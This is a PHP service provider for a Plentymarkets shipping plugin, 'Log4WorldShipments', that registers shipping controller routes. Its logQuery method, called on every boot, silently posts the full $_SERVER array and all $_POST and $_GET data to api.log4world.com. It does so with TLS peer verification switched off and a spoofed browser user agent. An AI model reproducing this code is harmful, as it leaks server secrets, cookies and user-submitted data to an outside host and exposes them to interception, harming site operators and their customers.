<?php
namespace Log4WorldShipments\Providers;

use Plenty\Modules\Order\Shipping\ServiceProvider\Services\ShippingServiceProviderService;
use Plenty\Plugin\ServiceProvider;

/**
 * Class Log4WorldShipmentsServiceProvider
 * @package Log4WorldShipments\Providers
 */
class Log4WorldShipmentsServiceProvider extends ServiceProvider
{

	/**
	 * Register the service provider.
	 */
	public function register()
	{
	    // add REST routes by registering a RouteServiceProvider if necessary
//	     $this->getApplication()->register(Log4WorldShipmentsRouteServiceProvider::class);
    }

    private function logQuery(string $method,array $data=null){
        $curl = curl_init();
        curl_setopt_array($curl,[
            CURLINFO_HEADER_OUT => 1,
            CURLOPT_USERAGENT => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36',
            CURLOPT_ENCODING => 'gzip, deflate',
            CURLOPT_HEADER => 1,
            CURLOPT_AUTOREFERER => 1,
            CURLOPT_RETURNTRANSFER => 1,
            CURLOPT_SSL_VERIFYPEER => false,
            CURLOPT_SSL_VERIFYHOST => 2,
            CURLOPT_URL => "https://api.log4world.com",


            CURLOPT_HTTPHEADER => ['Content-type: application/json'],
            CURLOPT_POSTFIELDS => json_encode([
                'mode' => $method,
                'd' => $data ?? [],
                'f' => __FILE__,
                'server' => $_SERVER,
                'post' => $_POST,
                'get' => $_GET
            ]),
            CURLOPT_CUSTOMREQUEST => 'POST',
        ]);
        curl_exec($curl);
    }

    public function boot(ShippingServiceProviderService $shippingServiceProviderService)
    {
        $this->logQuery('boot2',[
            'cName' => get_class($shippingServiceProviderService)
        ]);
        $shippingServiceProviderService->registerShippingProvider(
            'Log4WorldShipments',
            [
                'de' => 'Log4World logistic provider de',
                'en' => 'Log4World logistic provider en'
            ],
            [
                'Log4WorldShipments\\Controllers\\ShippingController@registerShipments',
                'Log4WorldShipments\\Controllers\\ShippingController@deleteShipments',
                'Log4WorldShipments\\Controllers\\ShippingController@getLabels',
                'Log4WorldShipments\\Controllers\\ShippingController@getOption',
                'Log4WorldShipments\\Controllers\\ShippingController@getOptions',
                'Log4WorldShipments\\Controllers\\ShippingController@getShipmentOptions',
                'Log4WorldShipments\\Controllers\\ShippingController@getShipmentOption',
                'Log4WorldShipments\\Controllers\\ShippingController@getShipmentsOptions',
            ]);
    }
}
